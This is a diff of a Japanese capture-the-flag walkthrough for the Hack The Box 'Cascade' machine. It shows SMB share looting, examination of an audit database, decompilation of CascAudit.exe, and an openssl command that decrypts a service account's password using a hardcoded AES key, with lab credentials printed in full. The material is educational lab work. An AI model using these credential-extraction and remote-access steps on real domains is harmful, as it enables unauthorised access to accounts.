@@ -443,9 +443,8 @@ Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -a----       10/27/2019   6:34 AM        1246720 SQLite.Interop.dll
 ```
-batを確認、CascAudit.exeを実行している  
-実際にbatを動かしてもdbファイルが見つからなそうな感じだったので、CascAudit.exeにdbを指定して実行  
-dbファイルに書き込みしている挙動だが、読み込み専用フォルダ内なので書き込みは失敗しているっぽい
+CascAudit.exeを実行するbatを確認、しかしbatを実行するとエラー  
+dbのパスを修正してCascAudit.exeを実行、dbファイルに書き込みする挙動っぽいが読み込み専用フォルダ内のため失敗しているっぽい
 ```powershell
 *Evil-WinRM* PS C:\Shares\Audit> cat RunAudit.bat
 CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
@@ -471,7 +470,7 @@ attempt to write a readonly database
    at CascAudiot.MainModule.Main()
 Successfully inserted 0 row(s) into database
 ```
-dbファイルを調査するためダウンロード
+dbファイルをダウンロード
 ```sh
 └─$ netexec smb 10.129.188.71 -u s.smith -p sT333ve2 --share Audit$ --get-file 'DB\Audit.db' '/home/kali/Audit.db'
 SMB         10.129.188.71  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) 
@@ -479,9 +478,8 @@ SMB         10.129.188.71  445    CASC-DC1         [+] cascade.local\s.smith:sT3
 SMB         10.129.188.71  445    CASC-DC1         [*] Copying "DB\Audit.db" to "/home/kali/Audit.db"
 SMB         10.129.188.71  445    CASC-DC1         [+] File "DB\Audit.db" was downloaded to "/home/kali/Audit.db"
 ```
-dbファイルをオープン  
-LdapテーブルにSTEP2で確認できたユーザ「arksvc」のパスワードっぽいものを発見  
-しかしパスワードスプレーをしてもログインできず、またbase系でデコードしたが文字化けする模様
+dbファイルのLdapテーブルにSTEP2で確認できたユーザ「arksvc」のパスワード`BQO5l5Kj9MdErXx6Q6AGOw==`を発見  
+しかしパスワードスプレーをしてもログインできず、base系でデコードできないためパスワードは暗号化されているっぽい
 ```sh
 └─$ sqlite3 Audit.db      
 SQLite version 3.46.1 2024-08-13 09:16:08
@@ -513,7 +511,7 @@ Id  uname   pwd                       domain
 sqlite> SELECT * FROM Misc;
 
 ```
-今度はdbファイルを書き込み可能なフォルダにコピーして、CascAudit.exeを動かすしてdbファイルを確認すると
+dbファイルを書き込み可能なフォルダにコピーしてCascAudit.exeの挙動を再度確認、今度はエラーは発生せず
 ```powershell
 *Evil-WinRM* PS C:\Shares\Audit> copy DB\audit.db C:\Users\s.smith\audit.db
 
@@ -523,7 +521,7 @@ Successfully inserted 2 row(s) into database
 
 *Evil-WinRM* PS C:\Shares\Audit> copy C:\Users\s.smith\audit.db \\10.10.16.11\share\
 ```
-新たにDeletedUserAuditテーブルに2行追加されていた。  
+dbファイルのDeletedUserAuditテーブルに新たに2行追加されていた。  
 改めてDistinguishedNameを確認すると、削除済オブジェクトであることが分かる  
 ```sh
 └─$ sqlite3 audit.db 
@@ -550,8 +548,8 @@ Id  Username   Name                                      DistinguishedName
 12  TempAdmin  TempAdmin                                 CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=D
                DEL:f0cc344d-31e0-4866-bceb-a842791ca059  eleted Objects,DC=cascade,DC=local
 ```
-ただ削除済オブジェクトを確認できるグループは「AD Recycle Bin」である  
-しかし現ユーザのs.smithはそのグループに所属していないため、なぜCascAudit.exe経由で削除済オブジェクトを参照できるのか
+しかし削除済オブジェクトを確認するためには「AD Recycle Bin」グループに所属する必要があるが、  
+現ユーザのs.smithはそのグループに所属していないもよう
 ```powershell
 *Evil-WinRM* PS C:\shares\audit> whoami /groups
 
@@ -573,9 +571,9 @@ CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370
 NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
 ```
-dbファイルのLdapテーブル内にユーザ名arksvcを確認したが、「AD Recycle Bin」グループに所属していることを確認  
+dbファイルのLdapテーブル内にユーザarksvcを確認したが、「AD Recycle Bin」グループに所属していることを確認  
 おそらくCascAudit.exeはdbファイルのLdapテーブル内のarksvcクレデンシャルを使用して削除済オブジェクトを参照していると推測  
-ということはCascAudit.exe内にLdapテーブル内のパスワードを復号できる鍵がハードコーディングされているかも
+ということはLdapテーブル内のパスワード`BQO5l5Kj9MdErXx6Q6AGOw==`を復号できる鍵がCascAudit.exe内にハードコーディングされているかも
 ```powershell
 *Evil-WinRM* PS C:\shares\audit> net user arksvc /do
 User name                    arksvc
@@ -605,9 +603,65 @@ Local Group Memberships      *AD Recycle Bin       *IT
 Global Group memberships     *Domain Users
 The command completed successfully.
 ```
+
+
+## STEP 5
+Audit$をダウンロード
 ```sh
-└─$ smbclient -U 'cascade.local/s.smith%sT333ve2' -c 'recurse ON; dir' //10.129.188.71/Audit$
+└─$ smbget --recursive -U 'cicade.local/s.smith%sT333ve2' smb://10.129.93.212/Audit$
+Using domain: CICADE.LOCAL, user: s.smith
+Using domain: CICADE.LOCAL, user: s.smith
+smb://10.129.93.212/Audit$/CascAudit.exe                                                                                                                                        
+Using domain: CICADE.LOCAL, user: s.smith
+smb://10.129.93.212/Audit$/CascCrypto.dll                                                                                                                                       
+Using domain: CICADE.LOCAL, user: s.smith
+Using domain: CICADE.LOCAL, user: s.smith
+smb://10.129.93.212/Audit$/DB/Audit.db                                                                                                                                          
+Using domain: CICADE.LOCAL, user: s.smith
+smb://10.129.93.212/Audit$/RunAudit.bat                                                                                                                                         
+Using domain: CICADE.LOCAL, user: s.smith
+smb://10.129.93.212/Audit$/System.Data.SQLite.dll                                                                                                                               
+Using domain: CICADE.LOCAL, user: s.smith
+smb://10.129.93.212/Audit$/System.Data.SQLite.EF6.dll                                                                                                                           
+Using domain: CICADE.LOCAL, user: s.smith
+Using domain: CICADE.LOCAL, user: s.smith
+smb://10.129.93.212/Audit$/x64/SQLite.Interop.dll                                                                                                                               
+Using domain: CICADE.LOCAL, user: s.smith
+Using domain: CICADE.LOCAL, user: s.smith
+smb://10.129.93.212/Audit$/x86/SQLite.Interop.dll                                                                                                                               
+Downloaded 3.33MB in 54 seconds
 
+└─$ tree         
+.
+├── CascAudit.exe
+├── CascCrypto.dll
+├── DB
+│   └── Audit.db
+├── RunAudit.bat
+├── System.Data.SQLite.dll
+├── System.Data.SQLite.EF6.dll
+├── x64
+│   └── SQLite.Interop.dll
+└── x86
+    └── SQLite.Interop.dll
 
+4 directories, 8 files
+```
+exeをreversingか、めんどいな  
+しかしめんどくさを裏切る朗報が！こいつ.NET製じゃないか
+```sh
+└─$ file CascAudit.exe 
+CascAudit.exe: PE32 executable for MS Windows 4.00 (console), Intel i386 Mono/.Net assembly, 3 sections
+```
+ということで`ILSpy`でCascAudit.exeをデコンパイル  
+`using CascCrypto`からCascAudit.exeの実行に`CascCrypto.dll`が必要であることを確認  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Cascade_02.png">  
+ダウンロードしたディレクトリごとオープン  
+パスワード復号処理をしているっぽいCrypto.DecryptStringを発見
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Cascade_03.png">  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Cascade_04.png">  
+```sh
+└─$ echo 'BQO5l5Kj9MdErXx6Q6AGOw==' | openssl enc -aes-128-cbc -d -base64 -K $(echo -n 'c4scadek3y654321' | xxd -p) -iv $(echo -n '1tdyjCbY1Ix49842'| xxd -p )
+w3lc0meFr31nd
 ```
 
